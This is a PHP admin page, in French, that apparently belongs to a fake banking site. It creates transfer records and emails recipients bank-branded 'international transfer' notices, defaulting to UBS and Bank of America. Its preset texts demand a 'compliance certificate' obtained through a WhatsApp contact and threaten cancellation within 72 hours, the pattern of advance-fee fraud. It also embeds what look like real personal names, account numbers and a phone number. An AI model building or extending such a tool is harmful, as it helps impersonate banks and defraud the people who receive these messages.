<?php
require_once 'config.php';

// Vérifier si l'utilisateur est connecté ET est admin
if (!isset($_SESSION['user_id']) || !isset($_SESSION['user_role']) || $_SESSION['user_role'] !== 'admin') {
    header("Location: login.php");
    exit;
}

// Récupérer la liste des clients
try {
    $stmt = $pdo->query("SELECT id, nom, prenom, email FROM utilisateurs WHERE role != 'admin' OR role IS NULL ORDER BY nom, prenom");
    $clients = $stmt->fetchAll();
} catch (Exception $e) {
    $clients = [];
}

$message = '';
$message_type = '';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    try {
        $code_swift = trim($_POST['code_swift']);
        $user_id = $_POST['user_id'];
        $email_destinataire = trim($_POST['email_destinataire'] ?? '');
        
        if (empty($code_swift)) {
            throw new Exception("Le code SWIFT est obligatoire");
        }
        
        if (empty($email_destinataire) || !filter_var($email_destinataire, FILTER_VALIDATE_EMAIL)) {
            throw new Exception("Veuillez entrer une adresse email destinataire valide.");
        }
        
        // Vérifier si le code existe déjà
        $check = $pdo->prepare("SELECT id FROM virements WHERE code_swift = ?");
        $check->execute([$code_swift]);
        if ($check->fetch()) {
            throw new Exception("Ce code SWIFT existe déjà. Veuillez en choisir un autre.");
        }

        $motif_virement = trim($_POST['motif_virement'] ?? '');
        
        $sql = "INSERT INTO virements (
            user_id, code_swift,
            expediteur_nom, expediteur_prenom, expediteur_pays,
            expediteur_numero_aba, expediteur_numero_compte, expediteur_nom_banque, expediteur_bic,
            destinataire_nom, destinataire_prenom, destinataire_pays,
            destinataire_code_banque, destinataire_code_guichet, destinataire_numero_compte,
            destinataire_nom_banque, destinataire_bic, devise, montant, date_valeur, motif_virement, motif, statut, pourcentage,
            contact_whatsapp, message_statut
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";
        
        $stmt = $pdo->prepare($sql);
        $stmt->execute([
            $user_id,
            $code_swift,
            $_POST['expediteur_nom'],
            $_POST['expediteur_prenom'],
            $_POST['expediteur_pays'],
            $_POST['expediteur_numero_aba'],
            $_POST['expediteur_numero_compte'],
            $_POST['expediteur_nom_banque'],
            $_POST['expediteur_bic'],
            $_POST['destinataire_nom'],
            $_POST['destinataire_prenom'],
            $_POST['destinataire_pays'],
            $_POST['destinataire_code_banque'],
            $_POST['destinataire_code_guichet'],
            $_POST['destinataire_numero_compte'],
            $_POST['destinataire_nom_banque'],
            $_POST['destinataire_bic'],
            $_POST['devise'],
            $_POST['montant'],
            $_POST['date_valeur'],
            $motif_virement !== '' ? $motif_virement : null,
            $_POST['motif'],
            $_POST['statut'],
            $_POST['pourcentage'],
            $_POST['contact_whatsapp'],
            $_POST['message_statut']
        ]);
        
        $subject = "Notification de virement international";
        $logo_file = getActiveLogo();
        $logo_label = strtoupper(htmlspecialchars($_POST['expediteur_nom_banque'] ?? 'BANK OF AMERICA'));
        $embeddedImages = [];
        if (!empty($logo_file) && file_exists($logo_file)) {
            $embeddedImages['email_logo'] = $logo_file;
        }

        $body = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Virement international</title></head><body style="font-family:Arial, sans-serif; background:#f4f6f9; margin:0; padding:0;">';
        $body .= '<table width="100%" cellpadding="0" cellspacing="0" style="background:#f4f6f9; padding:30px 0;">';
        $body .= '<tr><td align="center">';
        $body .= '<table width="600" cellpadding="0" cellspacing="0" style="background:#ffffff; border-radius:12px; overflow:hidden; box-shadow:0 0 20px rgba(0,0,0,0.08);">';
        $body .= '<tr><td style="padding:25px 25px 15px; text-align:center; background:#ffffff;">';
        if (!empty($embeddedImages)) {
            $body .= '<img src="cid:email_logo" alt="Logo" style="max-height:50px; display:block; margin:0 auto 14px;">';
        }
        $body .= '<div style="font-size:24px; color:#111111; font-weight:700; letter-spacing:1px;">' . $logo_label . '</div>';
        $body .= '</td></tr>';
        $body .= '<tr><td style="padding:25px; color:#333333;">';
        $body .= '<p style="font-size:16px; margin-bottom:18px;">Bonjour ' . htmlspecialchars($_POST['destinataire_nom'] . ' ' . $_POST['destinataire_prenom']) . ',</p>';
        $body .= '<p style="font-size:15px; line-height:1.7; margin-bottom:20px;">Vous avez été désigné comme bénéficiaire d’un virement international. <br> <a href="http://localhost/ubs/verification.php" style="color:#667eea; text-decoration:underline; font-weight:bold;">veuillez cliquer ici pour vérifier le statut de votre virement.</a></p>';
        $body .= '<table width="100%" cellpadding="0" cellspacing="0" style="font-size:15px; color:#333333;">';
        $body .= '<tr><td style="padding:10px 0; width:40%;"><strong>Référence :</strong></td><td style="padding:10px 0; width:60%; text-align:right;">' . htmlspecialchars($code_swift) . '</td></tr>';
        $body .= '<tr><td style="padding:10px 0;"><strong>Montant :</strong></td><td style="padding:10px 0; text-align:right;">' . htmlspecialchars(number_format((float)$_POST['montant'], 2, ',', ' ') . ' ' . htmlspecialchars($_POST['devise'])) . '</td></tr>';
        $body .= '<tr><td style="padding:10px 0;"><strong>Expéditeur :</strong></td><td style="padding:10px 0; text-align:right;">' . htmlspecialchars($_POST['expediteur_prenom'] . ' ' . $_POST['expediteur_nom']) . '</td></tr>';
        $body .= '<tr><td style="padding:10px 0;"><strong>Motif :</strong></td><td style="padding:10px 0; text-align:right;">' . nl2br(htmlspecialchars($_POST['motif_virement'] ?: $_POST['motif'])) . '</td></tr>';
        $body .= '</table>';
        $body .= '<p style="font-size:15px; line-height:1.7; margin:20px 0 0;">Veuillez contacter l’expéditeur pour entrer en possession de l’ordre de virement afin de valider la transaction.</p>';
        $body .= '<p style="font-size:15px; line-height:1.7; margin:20px 0 0;">Cordialement,<br><strong>' . $logo_label . '</strong></p>';
        $body .= '</td></tr></table></td></tr></table></body></html>';


        $sendResult = sendMailSMTP($email_destinataire, $subject, $body, '', $embeddedImages);

        if ($sendResult !== true) {
            throw new Exception("Le virement a été créé, mais l'email n'a pas pu être envoyé. Détail: " . $sendResult);
        }

        $message = "Virement créé avec succès ! Email envoyé à " . htmlspecialchars($email_destinataire) . ". Code SWIFT : " . $code_swift;
        $message_type = "success";
        
    } catch (Exception $e) {
        $message = "Erreur: " . $e->getMessage();
        $message_type = "danger";
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nouveau virement - Admin</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #f4f6f9;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .sidebar {
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            position: fixed;
            width: 250px;
            transition: all 0.3s;
            z-index: 1000;
            overflow-y: auto;
        }
        
        .sidebar.active {
            left: 0;
        }
        
        .sidebar-header {
            padding: 20px;
            font-size: 24px;
            font-weight: bold;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .sidebar a {
            color: rgba(255,255,255,0.8);
            text-decoration: none;
            padding: 15px 20px;
            display: block;
            transition: all 0.3s;
            border-left: 3px solid transparent;
        }
        
        .sidebar a:hover, .sidebar a.active {
            background: rgba(255,255,255,0.2);
            color: white;
            padding-left: 30px;
            border-left: 3px solid white;
        }
        
        .sidebar i {
            width: 25px;
            margin-right: 10px;
        }
        
        .menu-toggle {
            display: none;
            position: fixed;
            top: 15px;
            left: 15px;
            z-index: 1001;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            width: 45px;
            height: 45px;
            font-size: 20px;
            cursor: pointer;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .sidebar-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.5);
            z-index: 999;
        }
        
        .sidebar-overlay.active {
            display: block;
        }
        
        .main-content {
            margin-left: 250px;
            padding: 20px;
            transition: all 0.3s;
        }
        
        .admin-header {
            background: white;
            padding: 15px 25px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-bottom: 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .admin-header h2 {
            margin: 0;
            font-size: 1.5rem;
            color: #333;
        }
        
        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
            flex-wrap: wrap;
        }
        
        .info-help {
            background: #e7f3ff;
            border-left: 4px solid #2196F3;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        
        .form-card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .section-title {
            color: #667eea;
            font-size: 18px;
            font-weight: bold;
            margin: 20px 0 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid #eee;
        }
        
        .subtitle {
            font-weight: bold;
            margin: 15px 0 10px;
            color: #555;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            font-weight: 600;
            color: #555;
            margin-bottom: 5px;
            display: block;
        }
        
        .form-control {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        
        .text-danger {
            color: #dc3545;
        }
        
        .text-muted {
            color: #6c757d;
            font-size: 12px;
        }
        
        .btn {
            padding: 12px 25px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
            text-decoration: none;
            display: inline-block;
            transition: all 0.3s;
        }
        
        .btn-success {
            background: #28a745;
            color: white;
        }
        
        .btn-success:hover {
            background: #218838;
        }
        
        .btn-secondary {
            background: #6c757d;
            color: white;
        }
        
        .btn-secondary:hover {
            background: #5a6268;
        }
        
        @media (max-width: 768px) {
            .menu-toggle {
                display: block;
            }
            
            .sidebar {
                left: -250px;
            }
            
            .sidebar.active {
                left: 0;
            }
            
            .main-content {
                margin-left: 0;
                padding: 70px 15px 15px;
            }
            
            .admin-header {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .user-info {
                width: 100%;
                justify-content: space-between;
            }
            
            .btn {
                width: 100%;
                margin: 5px 0;
            }
            
            .text-right {
                text-align: center !important;
            }
        }
    </style>
</head>
<body>
    <button class="menu-toggle" id="menuToggle">
        <i class="fas fa-bars"></i>
    </button>
    
    <div class="sidebar-overlay" id="sidebarOverlay"></div>
    
    <div class="sidebar" id="sidebar">
        <div class="sidebar-header">
            <span><i class="fas fa-crown"></i> Admin</span>
            <i class="fas fa-times d-block d-md-none" id="closeSidebar" style="cursor: pointer;"></i>
        </div>
        <nav>
    <a href="admin-dashboard.php"><i class="fas fa-tachometer-alt"></i> Tableau de bord</a>
    <a href="admin-virements.php"><i class="fas fa-exchange-alt"></i> Virements</a>
    <a href="admin-cartes.php"><i class="fas fa-credit-card"></i> Cartes virtuelles</a>  <!-- NOUVEAU -->
    <a href="admin-nouveau-virement.php" class="active"><i class="fas fa-plus-circle"></i> Nouveau virement</a>
    <a href="admin-clients.php"><i class="fas fa-users"></i> Clients</a>
    <a href="logout.php" style="border-top: 1px solid rgba(255,255,255,0.1); margin-top: 50px;"><i class="fas fa-sign-out-alt"></i> Déconnexion</a>
</nav>
    </div>
    
    <div class="main-content">
        <div class="admin-header">
            <h2><i class="fas fa-plus-circle"></i> Nouveau virement</h2>
            <div class="user-info">
                <span><i class="fas fa-user"></i> <?= htmlspecialchars(($_SESSION['user_prenom'] ?? '') . ' ' . ($_SESSION['user_nom'] ?? '')) ?></span>
                <a href="logout.php" class="btn btn-danger btn-sm"><i class="fas fa-sign-out-alt"></i> Déconnexion</a>
            </div>
        </div>
        
        <?php if ($message): ?>
            <div class="alert alert-<?= $message_type ?> alert-dismissible fade show">
                <?= $message ?>
                <button type="button" class="close" data-dismiss="alert">&times;</button>
            </div>
        <?php endif; ?>
        
        <div class="info-help">
            <i class="fas fa-info-circle"></i> La sélection d'un client est maintenant facultative. Vous pouvez créer un virement sans client connecté.
        </div>
        
        <div class="form-card">
            <form method="POST">
                <!-- Sélection du client -->
                <h4 class="section-title">👤 Client concerné (facultatif)</h4>
                <div class="row">
                    <div class="col-md-12">
                        <div class="form-group">
                            <label>Sélectionner un client</label>
                            <select name="user_id" class="form-control">
                                <option value="">-- Aucun client --</option>
                                <?php foreach ($clients as $client): ?>
                                    <option value="<?= $client['id'] ?>">
                                        <?= htmlspecialchars($client['prenom'] . ' ' . $client['nom'] . ' (' . $client['email'] . ')') ?>
                                    </option>
                                <?php endforeach; ?>
                            </select>
                        </div>
                    </div>
                </div>
                
                <div class="row">
                    <div class="col-md-12">
                        <div class="form-group">
                            <label>Email destinataire <span class="text-danger">*</span></label>
                            <input type="email" name="email_destinataire" class="form-control" placeholder="exemple@domaine.com" required>
                            <small class="text-muted">L'email auquel le message de virement sera envoyé.</small>
                        </div>
                    </div>
                </div>
                
                <!-- Code SWIFT -->
                <div class="row">
                    <div class="col-md-12">
                        <div class="form-group">
                            <label>Code SWIFT <span class="text-danger">*</span></label>
                            <input type="text" name="code_swift" class="form-control" placeholder="Ex: TRX20260316ABC123" required>
                            <small class="text-muted">Ce code sera utilisé par le client pour accéder à son statut. Il doit être unique.</small>
                        </div>
                    </div>
                </div>
                
                <!-- Expéditeur -->
                <h4 class="section-title">📤 Informations sur l'expéditeur</h4>
                <div class="row">
                    <div class="col-md-4">
                        <div class="form-group">
                            <label>NOM</label>
                            <input type="text" name="expediteur_nom" class="form-control" value="DAVID" required>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="form-group">
                            <label>PRÉNOM</label>
                            <input type="text" name="expediteur_prenom" class="form-control" value="kash" required>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="form-group">
                            <label>PAYS</label>
                            <input type="text" name="expediteur_pays" class="form-control" value="ÉTATS-UNIS" required>
                        </div>
                    </div>
                </div>
                
                <div class="subtitle">Informations Bancaires</div>
                <div class="row">
                    <div class="col-md-3">
                        <div class="form-group">
                            <label>NUMERO ABA</label>
                            <input type="text" name="expediteur_numero_aba" class="form-control" value="136608876638" required>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="form-group">
                            <label>N° DE COMPTE</label>
                            <input type="text" name="expediteur_numero_compte" class="form-control" value="10863257126321" required>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="form-group">
                            <label>NOM DE LA BANQUE</label>
                            <input type="text" name="expediteur_nom_banque" class="form-control" value="UBS" required>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="form-group">
                            <label>BIC/SWIFT (expéditeur)</label>
                            <input type="text" name="expediteur_bic" class="form-control" value="BKBCGB2L" required>
                        </div>
                    </div>
                </div>
                
                <!-- Destinataire -->
                <h4 class="section-title">📥 Informations sur le destinataire</h4>
                <div class="row">
                    <div class="col-md-4">
                        <div class="form-group">
                            <label>NOM</label>
                            <input type="text" name="destinataire_nom" class="form-control" value="IRIE BI" required>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="form-group">
                            <label>PRÉNOM</label>
                            <input type="text" name="destinataire_prenom" class="form-control" value="ZAMBLE" required>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="form-group">
                            <label>PAYS</label>
                            <input type="text" name="destinataire_pays" class="form-control" value="CÔTE D'IVOIRE" required>
                        </div>
                    </div>
                </div>
                
                <div class="subtitle">Informations Bancaires</div>
                <div class="row">
                    <div class="col-md-3">
                        <div class="form-group">
                            <label>CODE BANQUE</label>
                            <input type="text" name="destinataire_code_banque" class="form-control" value="///">
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="form-group">
                            <label>CODE GUICHET</label>
                            <input type="text" name="destinataire_code_guichet" class="form-control" value="///">
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="form-group">
                            <label>N° DE COMPTE</label>
                            <input type="text" name="destinataire_numero_compte" class="form-control" value="CI650 01541 014706750009 60" required>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="form-group">
                            <label>BIC/SWIFT (destinataire)</label>
                            <input type="text" name="destinataire_bic" class="form-control" value="UGABGALI" required>
                        </div>
                    </div>
                    <div class="col-md-12">
                        <div class="form-group">
                            <label>NOM DE LA BANQUE</label>
                            <input type="text" name="destinataire_nom_banque" class="form-control" value="BANQUE DES DÉPÔTS DU TRÉSOR" required>
                        </div>
                    </div>
                </div>
                
                <!-- Virement -->
                <h4 class="section-title">💰 Virement</h4>
                <div class="row">
                    <div class="col-md-3">
                        <div class="form-group">
                            <label>Devise</label>
                            <select name="devise" class="form-control">
                                <option value="USD" selected>USD</option>
                                <option value="EUR">EUR</option>
                                <option value="GBP">GBP</option>
                            </select>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="form-group">
                            <label>Montant</label>
                            <input type="number" step="0.01" name="montant" class="form-control" value="55000.00" required>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="form-group">
                            <label>Date de valeur</label>
                            <input type="date" name="date_valeur" class="form-control" value="<?= date('Y-m-d') ?>" required>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="form-group">
                            <label>Motif du virement</label>
                            <textarea name="motif_virement" class="form-control" rows="2"></textarea>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="form-group">
                            <label>Statut</label>
                            <select name="statut" class="form-control">
                                <option value="En cours" selected>En cours</option>
                                <option value="En attente">En attente</option>
                                <option value="Validé">Validé</option>
                                <option value="Refusé">Refusé</option>
                                <option value="Terminé">Terminé</option>
                            </select>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="form-group">
                            <label>Pourcentage</label>
                            <input type="number" name="pourcentage" class="form-control" value="95" min="0" max="100">
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="form-group">
                            <label>Contact WhatsApp</label>
                            <input type="text" name="contact_whatsapp" class="form-control" value="+33745332562">
                        </div>
                    </div>
                    <div class="col-md-12">
                        <div class="form-group">
                            <label>Instruction pour finaliser le transfert</label>
                            <textarea name="motif" class="form-control" rows="3">Chers clients votre virement est en cours et sera disponible dans votre compte après obtention d'une attestation de conformité. Merci de contacter la direction de conformité pour l'obtention.</textarea>
                        </div>
                    </div>
                    <div class="col-md-12">
                        <div class="form-group">
                            <label>Message statut</label>
                            <textarea name="message_statut" class="form-control" rows="2">Veuillez noter que le virement sera annulé dans les 72heures si aucun justificatif n'est fourni !!</textarea>
                        </div>
                    </div>
                </div>
                
                <hr>
                <div class="text-right">
                    <a href="admin-virements.php" class="btn btn-secondary">Annuler</a>
                    <button type="submit" class="btn btn-success"><i class="fas fa-save"></i> Créer le virement</button>
                </div>
            </form>
        </div>
    </div>
    
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>
    
    <script>
    const menuToggle = document.getElementById('menuToggle');
    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('sidebarOverlay');
    const closeBtn = document.getElementById('closeSidebar');
    
    menuToggle.addEventListener('click', function() {
        sidebar.classList.add('active');
        overlay.classList.add('active');
    });
    
    overlay.addEventListener('click', function() {
        sidebar.classList.remove('active');
        overlay.classList.remove('active');
    });
    
    if (closeBtn) {
        closeBtn.addEventListener('click', function() {
            sidebar.classList.remove('active');
            overlay.classList.remove('active');
        });
    }
    
    window.addEventListener('resize', function() {
        if (window.innerWidth > 768) {
            sidebar.classList.remove('active');
            overlay.classList.remove('active');
        }
    });
    </script>
</body>
</html>